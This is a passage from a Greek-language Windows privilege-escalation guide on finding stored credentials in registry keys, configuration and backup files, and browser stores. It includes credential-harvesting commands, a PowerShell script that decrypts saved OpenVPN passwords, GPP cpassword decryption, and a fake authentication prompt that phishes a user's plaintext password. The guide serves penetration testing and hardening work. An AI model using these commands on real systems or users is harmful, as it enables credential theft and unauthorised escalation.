Ορισμένα plugins Java server διανέμονται ως αρχεία JAR στον κατάλογο `plugins` ενός server. Ένα αναγνώσιμο προσαρμοσμένο plugin μπορεί να περιέχει ρυθμίσεις ή bytecode με ενσωματωμένο διαπιστευτήριο υπηρεσίας. Ελέγξτε το αρχείο μόνο με εξουσιοδότηση και μην εμφανίζετε ανακτημένα μυστικά στα συνήθη αποτελέσματα απαρίθμησης. Μια διαδρομή plugin από μόνη της δεν αποδεικνύει ότι υπάρχει μυστικό, ενώ ένας ανακτημένος κωδικός πρόσβασης υπηρεσίας οδηγεί σε περισσότερα δικαιώματα μόνο αν ισχύει και για λογαριασμό με περισσότερα δικαιώματα. Ελέγξτε τα σχετικά ACL αρχείων και αντικαταστήστε τους επαναχρησιμοποιημένους κωδικούς με ξεχωριστά μυστικά. Δείτε τον [οδηγό εγκατάστασης plugin του PaperMC](https://docs.papermc.io/paper/adding-plugins/) για τη διάταξη καταλόγων και την [τεκμηρίωση JAR της Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) για τα περιεχόμενα των αρχείων.

### Διαπιστευτήρια ενσωματωμένης βάσης δεδομένων Openfire

Μια εγκατάσταση Openfire που χρησιμοποιεί την ενσωματωμένη βάση δεδομένων μπορεί να διατηρεί το `openfire.script` στον κατάλογο `Openfire\embedded-db`. Αν ο τρέχων λογαριασμός μπορεί να το διαβάσει, εξετάστε μαζί τις εγγραφές `OFUSER` και την ιδιότητα `passwordKey`. Η [τεκμηρίωση παρόχου χρηστών του Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) αναφέρει ότι οι κωδικοί πρόσβασης μπορούν να αποθηκεύονται σε απλό κείμενο ή κρυπτογραφημένοι με κλειδί που βρίσκεται σε αυτή την ιδιότητα. Ένας ανακτημένος κωδικός πρόσβασης έχει σημασία για κλιμάκωση δικαιωμάτων μόνο αν εξακολουθεί να ισχύει για ταυτότητα με περισσότερα δικαιώματα· το όνομα αρχείου από μόνο του δεν αποδεικνύει ούτε πρόσβαση ανάγνωσης ούτε επαναχρησιμοποίηση διαπιστευτηρίων. Η διαδρομή είναι ένδειξη για απογραφή, επομένως μην εμφανίζετε περιεχόμενα βάσης δεδομένων και διαπιστευτήρια στα συνήθη αποτελέσματα απαρίθμησης.

Το ξεχωριστό αρχείο `Openfire\conf\openfire.xml` μπορεί να αποκαλύψει τις ρυθμισμένες θύρες και τη διεπαφή bind της κονσόλας διαχείρισης, ακόμη και όταν χρησιμοποιείται εξωτερική βάση δεδομένων. Συνήθως το Openfire κάνει bind την κονσόλα διαχείρισης στο loopback· παρ' όλα αυτά, ένας τοπικός λογαριασμός μπορεί να έχει πρόσβαση στη διεύθυνση, αν ο listener εκτελείται. Ελέγξτε μαζί τον πραγματικό listener, τον εξουσιοδοτημένο ρόλο διαχειριστή, την πολιτική μεταφόρτωσης plugin και την ταυτότητα υπηρεσίας Openfire. Ένας διαχειριστής που μπορεί να εγκαταστήσει plugin ενδέχεται να προκαλέσει την εκτέλεση κώδικα plugin στο πλαίσιο της υπηρεσίας, η οποία μπορεί να έχει πολύ υψηλά δικαιώματα όταν η υπηρεσία εκτελείται ως LocalSystem. Ένας κωδικός πρόσβασης που ταιριάζει ή μια αναγνώσιμη διαδρομή ρυθμίσεων από μόνα τους δεν αποδεικνύουν πρόσβαση στην κονσόλα διαχείρισης ή εκτέλεση κώδικα. Δείτε τον [οδηγό εγκατάστασης και διαχείρισης plugin του προμηθευτή](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) και την [ιδιότητα API μεταφόρτωσης plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Ρύθμιση παραμέτρων server διαχείρισης forensics

Οι ρυθμίσεις server του Velociraptor, που συνήθως ονομάζονται `server.config.yaml`, μπορεί να περιέχουν το `CA.private_key` της εσωτερικής CA. Αν ένας χρήστης με λιγότερα δικαιώματα μπορεί να διαβάσει αυτό το κλειδί, ενδέχεται να μπορεί να εκδώσει πιστοποιητικό API client. Το αν αυτό οδηγεί σε περισσότερα δικαιώματα εξαρτάται από τους ρόλους χρηστών του server, την προσβασιμότητα του API και την ταυτότητα υπό την οποία εκτελείται ο server ή ο agent του στόχου. Μια ρύθμιση client περιέχει διαφορετικό υλικό· η εύρεσή της δεν αποδεικνύει πρόσβαση στην CA του server. Σε ορισμένες εγκαταστάσεις, το ιδιωτικό κλειδί CA παραμένει εκτός σύνδεσης, οπότε μια αναγνώσιμη ρύθμιση server μπορεί να μην περιέχει το κλειδί υπογραφής.

Σε Windows server, ελέγξτε τα ACL της ρύθμισης **server** στον κατάλογο εγκατάστασής του και τυχόν προστατευμένα αντίγραφα ασφαλείας. Μια πιθανή τοποθεσία είναι η `%ProgramFiles%\VelociraptorServer\server.config.yaml`· χρησιμοποιήστε τη διαδρομή που έχει ρυθμιστεί για την υπηρεσία, αν διαφέρει. Επιβεβαιώστε ότι η τρέχουσα ταυτότητα μπορεί να διαβάσει το αρχείο και ότι το `CA.private_key` υπάρχει πράγματι. Αποφύγετε την εμφάνιση του ιδιωτικού κλειδιού σε logs ή σε αποτελέσματα απαρίθμησης. Η ροή εργασίας `config api_client` του προμηθευτή χρησιμοποιεί το κλειδί CA για να εκδώσει πιστοποιητικό client, αλλά απαιτείται επίσης αποτελεσματικός ρόλος από την πλευρά του server· η δημιουργία ή η αλλαγή ρόλου μπορεί να απαιτεί πρόσβαση εγγραφής στο datastore ή επανεκκίνηση. Μια υπάρχουσα προνομιούχα ταυτότητα server μπορεί να προσφέρει διαδρομή ακόμη και όταν δεν είναι διαθέσιμες αυτές οι δυνατότητες εγγραφής. Τα API queries με δικαιώματα εκτέλεσης εκτελούνται στο σχετικό πλαίσιο server ή agent, το οποίο μπορεί να έχει πολύ υψηλά δικαιώματα.

Προστατεύστε τη ρύθμιση του server και τα αντίγραφα ασφαλείας με περιοριστικά ACL, διατηρήστε εκτός σύνδεσης το κλειδί υπογραφής CA όπου είναι δυνατό και περιορίστε τους ρόλους API και την πρόσβαση στους listeners. Δείτε την [τεκμηρίωση API του Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) και τις [οδηγίες ρυθμίσεων ασφαλείας](https://docs.velociraptor.app/docs/deployment/security/).

### Διαπιστευτήρια PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Το Solar-PuTTY είναι ξεχωριστός διαχειριστής συνεδριών. Η εγγενής κρυπτογραφημένη αποθήκη του μπορεί να βρίσκεται στη διαδρομή `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ενώ ένα εξαγόμενο αντίγραφο ασφαλείας συνεδριών μπορεί να ονομάζεται `sessions-backup.dat` και να αποθηκεύεται αλλού. Ο [οδηγός εξαγωγής της SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) αναφέρει ότι οι εξαγωγές είναι κρυπτογραφημένες με κωδικό πρόσβασης και μπορεί να περιέχουν συνεδρίες, κλειδιά, scripts, tags και συσχετίσεις· το [φόρουμ υποστήριξής της](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) προσδιορίζει την εγγενή αποθήκη. Ελέγξτε πρώτα τα δικαιώματα αρχείων και τις διαδρομές. Η εύρεση οποιουδήποτε από τα δύο αρχεία δεν αποκαλύπτει τον κωδικό πρόσβασής του ούτε αποδεικνύει ότι τυχόν αποθηκευμένα διαπιστευτήρια παραμένουν έγκυρα ή παρέχουν υψηλότερα δικαιώματα.

### Κλειδιά SSH Host του Putty

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Κλειδιά SSH στο μητρώο

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκεύονται στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, επομένως ελέγξτε αν υπάρχει κάτι ενδιαφέρον εκεί:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Αν βρείτε οποιαδήποτε εγγραφή σε αυτή τη διαδρομή, πιθανότατα πρόκειται για αποθηκευμένο SSH key. Είναι αποθηκευμένο κρυπτογραφημένο, αλλά μπορεί εύκολα να αποκρυπτογραφηθεί χρησιμοποιώντας το [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες σχετικά με αυτή την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω μερικά ssh keys, να τα προσθέσω με το `ssh-add` και να συνδεθώ μέσω ssh σε ένα μηχάνημα. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε χρήση του `dpapi.dll` κατά τον έλεγχο ταυτότητας με ασύμμετρο κλειδί.

### Αρχεία unattended

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Αντίγραφα ασφαλείας SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Τα αναγνώσιμα αρχεία αντιγράφων ασφαλείας Windows Imaging (`.wim`) μπορεί επίσης να περιέχουν offline `SAM`, `SECURITY` και `SYSTEM` hives. Δώστε προτεραιότητα σε τοπικά προσβάσιμους καταλόγους αντιγράφων ασφαλείας ή εικόνων και ελέγξτε τα **ονόματα των μελών** μιας εικόνας πριν από την εξαγωγή οτιδήποτε· το όνομα αρχείου `.wim` από μόνο του δεν αποδεικνύει ότι εκτίθενται hives, ενώ τα συνηθισμένα `install.wim`, `boot.wim` και οι εικόνες αποκατάστασης συχνά αποτελούν λανθασμένες ενδείξεις. Ένα SMB share είναι ξεχωριστή διαδρομή πρόσβασης και πρέπει να ελέγχεται μόνο όταν εμπίπτει στο πεδίο εφαρμογής. Δείτε τις [οδηγίες της Microsoft για τις εικόνες Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) και την [αναφορά αρχείων registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Διαπιστευτήρια Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Κρυφά αποθηκευμένος κωδικός πρόσβασης GPP

Παλαιότερα υπήρχε μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανημάτων μέσω των Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Πρώτον, τα Group Policy Objects (GPO), αποθηκευμένα ως αρχεία XML στο SYSVOL, ήταν προσβάσιμα από οποιονδήποτε χρήστη του domain. Δεύτερον, οι κωδικοί πρόσβασης σε αυτά τα GPP, κρυπτογραφημένοι με AES256 με χρήση ενός δημόσια τεκμηριωμένου προεπιλεγμένου κλειδιού, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε πιστοποιημένο χρήστη. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει στους χρήστες να αποκτήσουν αυξημένα δικαιώματα.

Για τον μετριασμό αυτού του κινδύνου, αναπτύχθηκε μια συνάρτηση που σαρώνει για τοπικά αποθηκευμένα αρχεία GPP τα οποία περιέχουν ένα πεδίο "cpassword" με μη κενή τιμή. Όταν εντοπίσει ένα τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό πρόσβασης και επιστρέφει ένα προσαρμοσμένο αντικείμενο PowerShell. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες για το GPP και τη θέση του αρχείου, διευκολύνοντας τον εντοπισμό και την αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε αυτά τα αρχεία στη θέση `C:\ProgramData\Microsoft\Group Policy\history` ή στη θέση _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (πριν από τα Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Χρήση του crackmapexec για την απόκτηση των κωδικών πρόσβασης:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Παράδειγμα web.config με διαπιστευτήρια:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Αντίγραφα ασφαλείας σε ZIP στο webroot του IIS

Ένα παλιό αντίγραφο ασφαλείας σε ZIP, τοποθετημένο απευθείας σε webroot που εξυπηρετείται, μπορεί να εκθέσει προηγούμενα αρχεία ρυθμίσεων και διαπιστευτήρια που μπορούν να επαναχρησιμοποιηθούν. Ελέγξτε τη ρυθμισμένη φυσική διαδρομή του ιστότοπου και αν το αρχείο είναι πράγματι προσβάσιμο μέσω HTTP, προτού το θεωρήσετε έκθεση. Η προεπιλεγμένη διαδρομή `C:\inetpub\wwwroot` είναι απλώς μια πιθανή επιλογή. Μια γρήγορη τοπική απογραφή μπορεί να εμφανίσει ονόματα και μεγέθη χωρίς να ανοίξει τα αρχεία:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ένα όνομα αρχείου αρχειοθέτησης δεν αποδεικνύει ότι περιέχει κάποιο μυστικό ή ότι τα διαπιστευτήρια που ανακτήθηκαν παρέχουν αυξημένα προνόμια.

### Διαπιστευτήρια OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Αρχεία καταγραφής

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα διαπιστευτήριά του ή ακόμα και τα διαπιστευτήρια ενός άλλου χρήστη**, αν πιστεύετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι το να ζητήσετε απευθείας από τον client τα **διαπιστευτήρια** είναι πραγματικά **επικίνδυνο**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που κάποτε περιείχαν **κωδικούς πρόσβασης** σε **απλό κείμενο** ή Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Οι βάσεις δεδομένων Password Safe v3 χρησιμοποιούν συνήθως την επέκταση `.psafe3`. Αντιμετωπίστε ένα αρχείο με αντίστοιχο όνομα ως πιθανό κρυπτογραφημένο θησαυροφυλάκιο· η παρουσία του δεν αποδεικνύει ότι μπορείτε να το διαβάσετε, να το ξεκλειδώσετε ή να χρησιμοποιήσετε διαπιστευτήρια που είναι αποθηκευμένα σε αυτό. Κατά τον έλεγχο της αποθήκευσης τέτοιων αρχείων, εξετάστε τα προσβάσιμα προφίλ χρηστών και τις διαμορφωμένες ρίζες κοινόχρηστων αρχείων.

Ένα αναγνώσιμο αρχείο KeePass `.kdbx` είναι επίσης απλώς ένδειξη ύπαρξης κρυπτογραφημένου θησαυροφυλακίου. Για να το ξεκλειδώσετε, απαιτούνται ο πραγματικός κύριος κωδικός πρόσβασης και τυχόν διαμορφωμένο αρχείο κλειδιού ή πρόσθετοι παράγοντες λογαριασμού. Αν ένας εξουσιοδοτημένος έλεγχος εντοπίσει σε μια καταχώριση ζεύγος κατακερματισμών LM:NT, επαληθεύστε τον κατονομαζόμενο λογαριασμό και αν ο κατακερματισμός NT είναι τρέχων και γίνεται δεκτός από την υπηρεσία NTLM του στόχου, πριν εξετάσετε το ενδεχόμενο [pass-the-hash](../ntlm/README.md#pass-the-hash). Μια καταχώριση θησαυροφυλακίου δεν παρέχει από μόνη της δικαιώματα Administrator ή SYSTEM· πρέπει επίσης να ισχύουν η απομακρυσμένη πρόσβαση στην υπηρεσία, τα δικαιώματα του λογαριασμού και τυχόν ξεχωριστό βήμα εκτέλεσης υπηρεσίας. Η απογραφή θα πρέπει να αναφέρει τη διαδρομή του θησαυροφυλακίου και αν είναι αναγνώσιμο, όχι να εμφανίζει τη βάση δεδομένων ή τα αποθηκευμένα διαπιστευτήρια.

Αναζητήστε όλα τα προτεινόμενα αρχεία:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Ελέγξτε τις προσβάσιμες καταχωρίσεις του Κάδου Ανακύκλωσης για διαγραμμένα αντίγραφα ασφαλείας και αρχεία ρυθμίσεων, καθώς και για αρχεία των οποίων τα ονόματα αναφέρουν ρητά διαπιστευτήρια. Ένα χρήσιμο αντίγραφο ασφαλείας `.7z`, `.zip` ή `.rar` μπορεί να είναι αρκετών μηνών και να έχει ένα συνηθισμένο όνομα αρχείου. Τα Windows αποθηκεύουν την αρχική διαδρομή και τον χρόνο διαγραφής σε μια εγγραφή `$I` και το διαγραμμένο αρχείο στην αντίστοιχη καταχώριση `$R`· εξετάστε τα μεταδεδομένα και ελέγξτε αν η τρέχουσα ταυτότητα έχει δικαίωμα ανάγνωσης, πριν ανοίξετε ένα αρχείο. Η ορατότητα εξαρτάται από τον τόμο, το SID του χρήστη και τα δικαιώματα αρχείων, επομένως μια κενή λίστα δεν αποδεικνύει ότι δεν υπάρχει ανακτήσιμο αντίγραφο ασφαλείας. Αντιμετωπίστε το όνομα ενός αρχείου ως υποψήφιο για έλεγχο, όχι ως απόδειξη ότι περιέχει έγκυρο μυστικό.

Ένα προσβάσιμο διαγραμμένο `.pfx` μπορεί επίσης να αποτελέσει ένδειξη για **code-signing**. Αν περιέχει προσβάσιμο ιδιωτικό κλειδί, το κλειδί μπορεί να υπογράψει ένα τροποποιημένο PowerShell script· το [PowerShell απαιτεί πιστοποιητικό code-signing με ιδιωτικό κλειδί](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), ενώ οι [κανόνες εκδότη του AppLocker αξιολογούν την ταυτότητα του υπογράφοντος και το πεδίο εφαρμογής του κανόνα](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Η εκτέλεση μεταξύ λογαριασμών απαιτεί η τρέχουσα ταυτότητα να μπορεί να τροποποιήσει το συγκεκριμένο script, να ισχύει ένας κανόνας που αποδέχεται την προκύπτουσα υπογραφή για το script και τον λογαριασμό-στόχο, και μια προγραμματισμένη εργασία ή άλλη διεργασία με υψηλότερα δικαιώματα να το εκτελεί πράγματι. Το όνομα ενός αρχείου `.pfx`, το θέμα του πιστοποιητικού ή ένα εγγράψιμο script από μόνο του δεν τεκμηριώνει αυτή την αλυσίδα. Ελέγξτε τα μεταδεδομένα, τις ACL, την πολιτική και την προγραμματισμένη εντολή πριν ανοίξετε υλικό ιδιωτικού κλειδιού ή ενεργοποιήσετε την εργασία.

Ελέγξτε επίσης προσβάσιμες βάσεις δεδομένων προφίλ εφαρμογών ανταλλαγής μηνυμάτων, σημειώσεις και ληφθέντα αρχεία για ενδείξεις διαπιστευτηρίων. Μια εξαγωγή ανάκτησης BitLocker μπορεί να είναι αποθηκευμένη ως HTML ή TXT, μερικές φορές μέσα σε ένα ονομασμένο αρχείο αντιγράφου ασφαλείας. Τέτοιο υλικό μπορεί να παρέχει πρόσβαση σε ξεχωριστό κρυπτογραφημένο τόμο δεδομένων που περιέχει παλαιότερα αντίγραφα ασφαλείας· εξετάστε τον τόμο και το αρχείο μόνο όταν έχετε εξουσιοδότηση. Αν ένα αντίγραφο ασφαλείας περιλαμβάνει το `NTDS.dit`, η ανάκτηση διαπιστευτηρίων τομέα εκτός σύνδεσης απαιτεί επίσης την αντίστοιχη ομάδα μητρώου `SYSTEM`, όπως περιγράφεται στη [ροή εργασίας για αντίγραφα ασφαλείας και προνομιούχες ομάδες](../active-directory-methodology/privileged-groups-and-token-privileges.md). Τα ονόματα αρχείων και ένας κλειδωμένος τόμος από μόνα τους δεν αποδεικνύουν ότι υπάρχει χρησιμοποιήσιμο κλειδί ανάκτησης ή αντίγραφο ασφαλείας τομέα.

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο μητρώο

**Άλλα πιθανά κλειδιά μητρώου με διαπιστευτήρια**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Εξαγωγή κλειδιών openssh από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό προγραμμάτων περιήγησης

Θα πρέπει να ελέγξετε για βάσεις δεδομένων όπου αποθηκεύονται κωδικοί πρόσβασης από τα **Chrome, Edge ή Firefox**.\
Ελέγξτε επίσης το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των προγραμμάτων περιήγησης, καθώς μπορεί να είναι αποθηκευμένοι εκεί **κωδικοί πρόσβασης**.

Για το συμβατικό προφίλ Edge **Default** του τρέχοντος χρήστη, το `Login Data` βρίσκεται στο `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, ενώ το `Local State` βρίσκεται στον γονικό κατάλογο `User Data`. [Η Microsoft τεκμηριώνει την προεπιλεγμένη θέση προφίλ](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)· κάποιο άλλο προφίλ ή μια πολιτική `UserDataDir` μπορεί να αλλάξει αυτή τη θέση. Η παρουσία αρχείων αποτελεί μόνο ένδειξη για πιθανό χώρο αποθήκευσης διαπιστευτηρίων: επιβεβαιώστε ότι τα αρχεία είναι αναγνώσιμα, ότι διαθέτετε το κατάλληλο πλαίσιο DPAPI του χρήστη ή άλλο εξουσιοδοτημένο υλικό κλειδιού και ότι μια αποθηκευμένη σύνδεση ανήκει σε λογαριασμό με περισσότερα προνόμια. Η απλή απαρίθμηση διαδρομών δεν απαιτεί άνοιγμα της βάσης δεδομένων ή εμφάνιση αποκρυπτογραφημένων κωδικών πρόσβασης.

